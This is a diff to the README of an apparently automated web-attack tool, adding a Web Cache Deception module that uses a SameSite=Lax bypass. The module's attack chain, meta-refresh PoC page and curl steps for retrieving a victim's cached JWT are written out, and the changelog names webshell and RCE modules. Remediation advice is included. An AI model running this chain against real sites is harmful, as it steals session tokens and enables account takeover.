@@ -737,6 +737,125 @@ http://target.com/?html=
 
 ---
 
+### Web Cache Deception + SameSite Lax Bypass (v2.1)
+
+> **Research basis:**  
+> [Clement Osei-Somuah (tinopreter) — "Cracking SameSite for a $2,000 Web Cache Deception"](https://medium.com/@tinopreter/cracking-samesite-for-a-2-000-web-cache-deception-746972278412)  
+> Published: May 29, 2026 — $2,000 bounty on HackerOne  
+> **Skill module:** `WebCacheDeception` (id: 50)
+
+**Key insight:**
+
+Web Cache Deception (WCD) tricks a CDN or reverse proxy into caching a page containing **user-specific sensitive data** (JWT, PII, session token), then an attacker retrieves the cached response without authentication.
+
+The classic attack requires the victim's browser to send their **session cookie** to the target — normally blocked by `SameSite=Lax`. The bypass: use `<meta http-equiv="refresh">` on an attacker-hosted page, which the browser treats as a **top-level navigation**. `SameSite=Lax` cookies **are** sent on top-level navigation by design.
+
+**Attack chain:**
+
+```
+① Attacker identifies a page with:
+   - No Cache-Control: private / no-store
+   - X-Cache / CF-Cache-Status / Age header → CDN active
+   - Sensitive data in response (JWT, email, user ID)
+
+② Attacker crafts a unique cache-buster URL:
+   https://target.com/profile?cb=ATTACKER_UNIQUE
+
+③ Attacker-hosted page delivers meta-refresh:
+   <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=ATTACKER_UNIQUE">
+   ↳ Browser performs top-level navigation → SameSite=Lax cookies included
+
+④ Victim visits attacker's page (1-click or embedded):
+   - Victim's authenticated response cached at target.com/profile?cb=ATTACKER_UNIQUE
+
+⑤ Attacker fetches same URL (no auth):
+   curl https://target.com/profile?cb=ATTACKER_UNIQUE
+   ↳ Gets victim's cached response containing JWT/session token
+
+⑥ Attacker uses stolen JWT to impersonate victim → Account Takeover
+```
+
+**SameSite bypass detail:**
+
+| Request type | SameSite=Lax | SameSite=Strict |
+|---|---|---|
+| `<img src=...>` (subresource) | ❌ Blocked | ❌ Blocked |
+| `fetch()` / XHR (AJAX) | ❌ Blocked | ❌ Blocked |
+| `<a href=...>` link click | ✅ Allowed | ❌ Blocked |
+| `<meta http-equiv="refresh">` | ✅ **Allowed** ← bypass | ❌ Blocked |
+| Browser address bar navigation | ✅ Allowed | ❌ Blocked |
+
+**`<meta http-equiv="refresh">` = top-level navigation → SameSite=Lax cookies are sent**
+
+**AI auto-trigger conditions** (bingo activates automatically):
+
+| Condition | Detection method |
+|---|---|
+| `X-Cache`, `CF-Cache-Status`, `Age` header present | HTTP response header analysis |
+| CDN keywords in headers (`cloudflare`, `fastly`, `varnish`) | Header fingerprinting |
+| Cache-Control missing `private` or `no-store` | Header analysis |
+| Web target (any `http://` or `https://`) | Default attempt for all web targets |
+
+**Cache confirmation test** (MISS → HIT):
+
+```bash
+# First request (MISS expected):
+curl -I "https://target.com/profile?cb=abc123"
+# X-Cache: MISS
+
+# Wait 1 second, same URL:
+curl -I "https://target.com/profile?cb=abc123"
+# X-Cache: HIT  ← caching confirmed
+```
+
+**Finding types and evidence levels:**
+
+| Finding | Evidence Level | Severity |
+|---|---|---|
+| `cache_header_detected` | `VERIFIED` (response header) | Info |
+| `cacheable_without_private` | `VERIFIED` (header analysis) | Medium |
+| `sensitive_data_in_cache` | `VERIFIED` (body analysis: JWT/token/email found) | High |
+| `cache_confirmed_miss_to_hit` | `VERIFIED` (two-request confirmation) | High |
+| `samesite_lax_bypass_possible` | `VERIFIED` (cookie attribute) | High |
+| `wcd_exploitable` | `VERIFIED` (all conditions confirmed) | Critical |
+| `wcd_likely` | `LIKELY` (cache confirmed, manual auth test needed) | High |
+| `sensitive_path_cacheable` | `LIKELY` (/profile /settings /dashboard) | High |
+
+**Auto-generated PoC HTML:**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- SameSite=Lax Bypass: meta-refresh = Top-Level Navigation
+         Browser includes Lax cookies on top-level navigation by spec -->
+    <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=UNIQUE">
+</head>
+<body>
+    <h3>Loading...</h3>
+    <!-- Fallback anchor -->
+    <a href="https://target.com/profile?cb=UNIQUE">Click here</a>
+</body>
+</html>
+```
+
+**Requirements:**
+
+1. Target page served through CDN/caching proxy (Cloudflare, Fastly, Varnish, Nginx, etc.)
+2. Page lacks `Cache-Control: private` or `no-store`
+3. Sensitive data (JWT, session, PII) present in response body
+4. `SameSite=Lax` or unset (browser default) — does NOT work with `SameSite=Strict`
+
+**Remediation (auto-included in report):**
+1. **Add `Cache-Control: no-store, private`** to all authenticated/user-specific responses
+2. **Upgrade `SameSite=Strict`** on session cookies — prevents all cross-site cookie delivery
+3. **Purge CDN cache** immediately for affected paths
+4. **Configure CDN to never cache** paths with `Set-Cookie` in response headers
+5. **Add `Vary: Cookie`** header to ensure per-user cache separation
+6. **Automated cache header CI check** — flag any authenticated endpoint missing `private`
+
+---
+
 ### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)
 
 > **Research basis:**  
@@ -1079,7 +1198,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **49 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49)
+- **50 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
